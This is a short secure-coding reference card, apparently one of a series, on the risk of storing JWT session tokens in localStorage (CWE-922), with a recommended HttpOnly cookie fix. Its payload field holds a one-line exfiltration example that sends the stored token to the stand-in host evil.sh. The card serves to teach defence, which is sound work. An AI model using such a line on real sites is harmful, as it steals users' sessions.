---
order: 7
cwe: 922
title: Tokens in localStorage
category: session
severity: high
sink: |-
    localStorage.setItem("token", jwt)
payload: |-
    new Image().src = "//evil.sh?t=" + localStorage.token
fix: |
    Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax; Path=/
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
---

Storage is readable by every script on the origin — one XSS, one compromised dependency, and the token walks. An `HttpOnly` cookie cannot be read by JavaScript at all; the attacker has to ride the session live instead of stealing it for later. Cookies bring CSRF back, so pair them with its defences.
